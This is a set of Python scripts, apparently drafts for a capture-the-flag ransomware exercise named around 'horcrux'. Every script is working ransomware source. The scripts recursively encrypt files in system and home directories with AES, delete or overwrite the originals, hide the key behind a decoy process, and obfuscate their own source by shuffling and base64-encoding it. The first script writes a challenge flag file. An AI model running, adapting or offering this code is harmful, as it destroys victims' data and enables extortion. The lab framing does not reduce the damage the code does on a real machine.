import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Constants
KEY_SIZE = 8  # 64-bit
BLOCK_SIZE = 16
ENC_EXT = ".voldemort"

# Padding helpers
def pad(data):
    pad_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([pad_len] * pad_len)

def encrypt_file(file_path, cipher):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = cipher.encrypt(pad(data))
    with open(file_path + ENC_EXT, 'wb') as f:
        f.write(encrypted_data)
    os.remove(file_path)

def generate_key():
    raw_key = get_random_bytes(KEY_SIZE)
    padded_key = raw_key.ljust(BLOCK_SIZE, b'\0')  # AES-128 requires 16 bytes
    return raw_key, padded_key

def encrypt_directory(root_path, cipher):
    for foldername, subfolders, filenames in os.walk(root_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            # Avoid encrypting already encrypted or hidden files
            if not file_path.endswith(ENC_EXT) and not filename.startswith('.'):
                try:
                    encrypt_file(file_path, cipher)
                    print(f"[+] Encrypted: {file_path}")
                except Exception as e:
                    print(f"[-] Skipped (Error): {file_path} — {e}")

def main():
    print("[*] Generating AES-128 key...")
    raw_key, aes_key = generate_key()

    cipher = AES.new(aes_key, AES.MODE_ECB)

    print("[*] Encrypting all files under current directory...")
    encrypt_directory(os.getcwd(), cipher)

    # Store base64 key for next step
    encoded_key = base64.b64encode(raw_key).decode()
    with open("temp_horcrux_key.txt", "w") as f:
        f.write(encoded_key)
    
    print(f"[✔] Encryption complete. Base64 Key stored temporarily.")

if __name__ == "__main__":
    main()

```


### 2 

import os
import subprocess
import base64
import signal
import time

KEY_FILE_TMP = "temp_horcrux_key.txt"
RESTORE_PATH = "/tmp/horcrux"
PROCESS_NAME = "horcrux"

def read_key():
    with open(KEY_FILE_TMP, "r") as f:
        return f.read()

def restore_key(encoded_key):
    with open(RESTORE_PATH, "w") as f:
        f.write(encoded_key)
    print(f"[✔] Key restored to {RESTORE_PATH}")

def main():
    encoded_key = read_key()

    print("[*] Starting Horcrux process to guard the key...")

    # Start dummy long process (simulate 'horcrux' process)
    proc = subprocess.Popen(["sleep", "9999"])
    pid = proc.pid

    print(f"[+] Horcrux PID: {pid} (kill this to release the key)")

    # Remove the file from disk
    os.remove(KEY_FILE_TMP)

    try:
        # Monitor process
        while True:
            ret = proc.poll()
            if ret is not None:
                print("[!] Horcrux process killed.")
                restore_key(encoded_key)
                break
            time.sleep(2)

    except KeyboardInterrupt:
        print("[!] Interrupted manually.")
        proc.kill()
        restore_key(encoded_key)

if __name__ == "__main__":
    main()

### 3
import random
import base64
import json

def obfuscate_code(input_file, output_file="obfuscated_payload.txt"):
    with open(input_file, "r") as f:
        code = f.read()

    chars = list(code)
    indices = list(range(len(chars)))
    random.shuffle(indices)

    shuffled = ''.join([chars[i] for i in indices])
    index_map = indices

    encoded = base64.b64encode(shuffled.encode()).decode()

    with open(output_file, "w") as f:
        json.dump({"encoded": encoded, "index_map": index_map}, f)

    print(f"[+] Obfuscated code saved to '{output_file}'")

# Example usage
# obfuscate_code("malware.py")

### final 
import os
import base64
import random
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# --- Constants ---
HOME_DIR = str(Path.home())
KEY_FILE = "/tmp/horcrux"
HORCRUX_PROC_NAME = "horcrux"
OBFUSCATED_FILE = "/tmp/obfuscated_payload.txt"

# --- Key Generation ---
def generate_key():
    key = get_random_bytes(16)  # AES-128 bit = 16 bytes
    encoded_key = base64.b64encode(key).decode()
    return key, encoded_key

# --- AES Encryption ---
def encrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        with open(filepath, "wb") as f:
            f.write(cipher.nonce + tag + ciphertext)
    except Exception as e:
        pass  # Silently fail on protected/locked files

# --- Encrypt Home Directory ---
def encrypt_user_files(key):
    for root, dirs, files in os.walk(HOME_DIR):
        for name in files:
            filepath = os.path.join(root, name)
            encrypt_file(filepath, key)

# --- Hide Key in RAM ---
def hide_key(encoded_key):
    with open(KEY_FILE, "w") as f:
        f.write(encoded_key)
    proc = subprocess.Popen(["sleep", "9999"], stdout=subprocess.DEVNULL)
    print(f"[+] Key hidden in memory. PID: {proc.pid} (tagged as '{HORCRUX_PROC_NAME}')")
    os.remove(KEY_FILE)
    return proc.pid

# --- Watchdog to Restore Key on Process Kill ---
def monitor_horcrux(pid, encoded_key):
    try:
        while True:
            os.kill(pid, 0)
    except ProcessLookupError:
        print("[!] Horcrux destroyed. Restoring key...")
        with open(KEY_FILE, "w") as f:
            f.write(encoded_key)

# --- Obfuscate Script Itself ---
def obfuscate_script():
    with open(__file__, "r") as f:
        code = f.read()

    # Shuffle characters
    chars = list(code)
    indices = list(range(len(chars)))
    random.shuffle(indices)
    shuffled = ''.join(chars[i] for i in indices)

    # Encode to base64 and store index map
    b64_data = base64.b64encode(shuffled.encode()).decode()
    with open(OBFUSCATED_FILE, "w") as f:
        f.write(f"{b64_data}\n{','.join(map(str, indices))}")
    print(f"[+] Obfuscated payload saved to {OBFUSCATED_FILE}")

# --- Main Execution ---
def main():
    key, encoded_key = generate_key()
    encrypt_user_files(key)
    pid = hide_key(encoded_key)
    obfuscate_script()
    monitor_horcrux(pid, encoded_key)

if __name__ == "__main__":
    main()
